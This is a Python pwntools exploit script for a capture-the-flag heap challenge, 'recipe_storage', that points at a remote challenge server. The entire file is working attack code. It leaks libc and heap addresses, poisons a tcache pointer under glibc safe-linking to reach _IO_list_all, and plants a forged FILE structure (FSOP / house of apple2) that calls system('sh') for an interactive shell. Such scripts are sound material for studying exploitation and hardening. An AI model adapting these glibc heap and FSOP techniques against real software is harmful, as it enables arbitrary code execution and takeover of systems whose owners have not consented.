
#!/usr/bin/env python3
from ctypes import CDLL
import time
from subprocess import Popen
from pwncli import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './recipe_storage_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
# libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "recipe-storage.challs.brunnerne.xyz", 31000


gdbscript = '''
init-pwndbg
# set architecture aarch64
# target remote :5000
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, aslr=False)
    else:
        return process([exe] + argv, aslr=True)

def debug():
    global gdbscript, pid
    if not args.REMOTE and not args.GDB:
        if args.QEMU:
            gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
            for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
                gdb_args.extend(["-ex", cmd])
            Popen(gdb_args)
        elif args.DOCKER:
            gdbscript = f'''
            init-pwndbg
            set sysroot /proc/{pid}/root
            c
            '''.format(**locals())        
            attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
        else:
            attach(io, gdbscript=gdbscript)

s       = lambda data               :io.send(data)
sa      = lambda x, y               :io.sendafter(x, y)
sl      = lambda data               :io.sendline(data)
sla     = lambda x, y               :io.sendlineafter(x, y)
r       = lambda delims             :io.recv(delims)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
rl      = lambda                    :io.recvline()
uu32    = lambda data,num           :u32(io.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(io.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{}: {}'.format(name, addr))
l64     = lambda                    :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
ns      = lambda p, data            :next(p.search(data))
nsa     = lambda p, instr           :next(p.search(asm(instr, arch=p.arch)))


# =========================================================
#                         EXPLOITS
# =========================================================
# Heap Protection
def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

# FSOP
def fsop(fp=None, offset=0x18):
    fp = fp if fp is not None else libc.sym["_IO_2_1_stdout_"]
    fs = IO_FILE_plus_struct()
    fs.flags = b"  sh;".ljust(0x8,b"\x00")   
    fs._IO_read_end = fp
    fs._lock = fp+0x100
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset - 0x18 # _IO_wfile_overflow -> _IO_wdoallocbuf+43
    return bytes(fs)

def fsop_shell(fp=None, rip=None, exit=True):
    io_obj = IO_FILE_plus_struct()
    fn = (
        io_obj.house_of_apple2_execmd_when_exit
        if exit
        else io_obj.house_of_apple2_execmd_when_do_IO_operation
    )
    return fn(
        fp if fp is not None else libc.sym["_IO_2_1_stdout_"],
        libc.sym["_IO_wfile_jumps"],
        rip if rip is not None else libc.sym["system"],
        "sh",
    )

def menu(op):
    sla("> ", str(op).encode())

def alloc(idx, size, content):
    menu(1)
    menu(size)
    menu(idx)
    sa("> ", content)

def free(idx):
    menu(2)
    menu(idx)

def view(idx):
    menu(3)
    menu(idx)

def edit(idx, content):
    menu(4)
    menu(idx)
    sa("> ", content)

def exploit():
    global io
    io = initialize()
    with log.progress("Leak heap & libc"), context.silent:
        alloc(0, 0x428, b"a")
        alloc(1, 0x18, b"a")
        alloc(2, 0x18, b"a")
        free(0)
        free(1)
        free(2)
        alloc(2, 0x18, b"a")
        alloc(1, 0x18, b"a")
        alloc(0, 0x428, b"a")
        view(0)
        libc_leak = u64(rl().strip().ljust(8, b"\x00")) & ~0xff
        libc.address = libc_leak - (libc.sym["main_arena"] + 64)
        view(2)
        heap_leak = demangle(u64(rl().strip().ljust(8, b"\x00")) & ~0xff)
        heap = heap_leak & ~0xfff
    leak("Libc leak", hex(libc_leak))
    leak("Libc base address", hex(libc.address))
    leak("Heap leak", hex(heap_leak))
    leak("Heap base address", hex(heap))
    with log.progress("FSOP to _IO_list_all"), context.silent:
        fp = heap + 0x790
        payload = fsop(fp)
        for i in range(4):
            alloc(3 + i, 0x18, b"a"*0x18)
        edit(3, b"a"*0x18 + b"\x61")
        free(4)
        free(6)
        free(5)
        alloc(4, 0x58, b"a"*0x18 + p64(0x21) + p64(mangle(heap, libc.sym["_IO_list_all"])))
        alloc(5, 0x18, b"a")
        alloc(6, 0x18, p64(fp))
        alloc(10, 0xe8, payload)
        debug()
        menu(5)
    io.interactive()

if __name__ == '__main__':
    exploit()
